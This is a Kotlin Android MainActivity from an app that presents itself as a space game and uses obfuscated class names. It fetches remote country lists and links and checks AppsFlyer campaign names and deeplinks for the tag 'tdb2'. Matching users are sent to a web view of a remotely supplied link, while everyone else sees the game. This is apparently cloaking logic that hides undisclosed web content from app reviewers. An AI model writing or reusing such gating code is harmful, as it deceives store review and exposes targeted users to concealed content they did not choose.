package com.game.space.sh

import android.content.Intent
import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.activity.viewModels
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.game.space.sh.databinding.ActivityMainBinding
import com.game.space.sh.kcixuhuvd.ConstanceAppClass
import com.game.space.sh.kcixuhuvd.ConstanceAppClass.C1
import com.game.space.sh.kcixuhuvd.ConstanceAppClass.DEEPL
import com.game.space.sh.kcixuhuvd.ConstanceAppClass.MAIN_ID
import com.game.space.sh.kcixuhuvd.ConstanceAppClass.appsCheck
import com.game.space.sh.kcixuhuvd.ConstanceAppClass.link
import com.game.space.sh.xdospdi.Gysixozxijcs
import com.game.space.sh.kcixuhuvd.RaptorViewModel
import com.game.space.sh.qpwosjid.WWActivity
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {
    var retData : String? = ""
    var countriesPool : String =""
    var countryCode : String =""
    var linkView : String? = ""
    var appsChecker : String? = ""
    var retroData : String? = ""
    private val baseViewModel: RaptorViewModel by viewModels()
    lateinit var bindMainAct: ActivityMainBinding

    private lateinit var sharedDeep : SharedPreferences
    private lateinit var sharedNaming : SharedPreferences
    private lateinit var sharedlink : SharedPreferences
    private lateinit var sharedAppsCheck : SharedPreferences
    private lateinit var sharedMainId : SharedPreferences


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindMainAct = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainAct.root)
        sharedAppsCheck = getSharedPreferences(appsCheck, MODE_PRIVATE)
        sharedlink = getSharedPreferences(link, MODE_PRIVATE)
        sharedMainId = getSharedPreferences(MAIN_ID, MODE_PRIVATE)
        sharedDeep= getSharedPreferences(DEEPL, MODE_PRIVATE)
        sharedNaming= getSharedPreferences(C1, MODE_PRIVATE)
        lifecycleScope.launch {
            baseViewModel.deePP(this@MainActivity)
            AppsFlyerLib.getInstance()
                .init(ConstanceAppClass.appsflyer, conversionDataListener, applicationContext)
            AppsFlyerLib.getInstance().start(this@MainActivity)
        }
        networkJob()

    }

    private fun getAdId(){
        val adInfo = AdvertisingIdClient(applicationContext)
        adInfo.start()
        val adIdInfo = adInfo.info.id
        Log.d("getAdvertisingId = ", adIdInfo.toString())
        sharedMainId.edit().putString(MAIN_ID,adIdInfo).apply()
    }


    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            sharedNaming.edit().putString(C1,dataGotten).apply()
        }

        override fun onConversionDataFail(p0: String?) {
            Log.e("dev_test", "error getting conversion data: $p0" );
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }



    private fun networkJob(){
        baseViewModel.getData()
        baseViewModel.countryCodeJS.observe(this,{
            Log.d("Data", "countryCode: $retData ")
            retData =  it.body()?.countryCode
            countryCode = retData.toString()
            baseViewModel.getDataDev()
            baseViewModel.geoDev.observe(this,{
                linkView = it.body()?.view
                Log.d("Data", "getDataDev: $linkView")
                appsChecker = it.body()?.appsChecker
                sharedAppsCheck.edit().putString(appsCheck,appsChecker).apply()
                sharedlink.edit().putString(link,linkView).apply()
                retroData = it.body()?.geo

                countriesPool = retroData.toString()
                Log.d("DataGeo", retroData.toString())
                checker()
            })

        })


    }


    private fun checker() {
        lifecycleScope.launch(Dispatchers.IO) {
            val intentNorm = Intent(this@MainActivity, WWActivity::class.java)
            val appsCh = sharedAppsCheck.getString(appsCheck,"null")
            var naming: String? = sharedNaming.getString(C1,"null")
            val deeplink: String? = sharedDeep.getString(DEEPL,"null")
            Log.d("CountryPool", countriesPool)
            Log.d("CountryCode", countryCode)
            getAdId()
            val wsowslxoc = Executors.newSingleThreadScheduledExecutor()
            if (appsCh == "1") {
                wsowslxoc.scheduleAtFixedRate({
                    if (naming != null) {
                        if (naming!!.contains("tdb2") && deeplink!!.contains(
                                "tdb2"
                            )
                        ) {
                            wsowslxoc.shutdown()
                            intentNorm.putExtra("WebInt", "campaign")
                            startActivity(intentNorm)
                            finish()


                        } else if(naming!!.contains("tdb2") || countriesPool.contains(countryCode)){
                            wsowslxoc.shutdown()
                            intentNorm.putExtra("WebInt", "campaign")
                            startActivity(intentNorm)
                            finish()
                        } else if(deeplink!!.contains("tdb2") && !naming!!.contains("tdb2") ){
                            wsowslxoc.shutdown()
                            intentNorm.putExtra("WebInt", "deepLink")
                            startActivity(intentNorm)
                            finish()
                        } else {
                            wsowslxoc.shutdown()
                            startActivity(Intent(this@MainActivity, Gysixozxijcs::class.java))
                            finish()
                        }
                    } else {
                        naming = sharedNaming.getString(C1,"null")
                        Log.d("Apps Checker", "naming: ${naming}")
                    }
                },0, 2, TimeUnit.SECONDS)
            } else {
              if(deeplink!!.contains("tdb2")){
                  intentNorm.putExtra("WebInt", "deepLink")
                  startActivity(intentNorm)
                  finish()
              } else if(countriesPool.contains(countryCode)){
                  intentNorm.putExtra("WebInt", "MT")
                  startActivity(intentNorm)
                  finish()
              } else {
                  startActivity(Intent(this@MainActivity, Gysixozxijcs::class.java))
                  finish()
              }
            }

        }
    }
}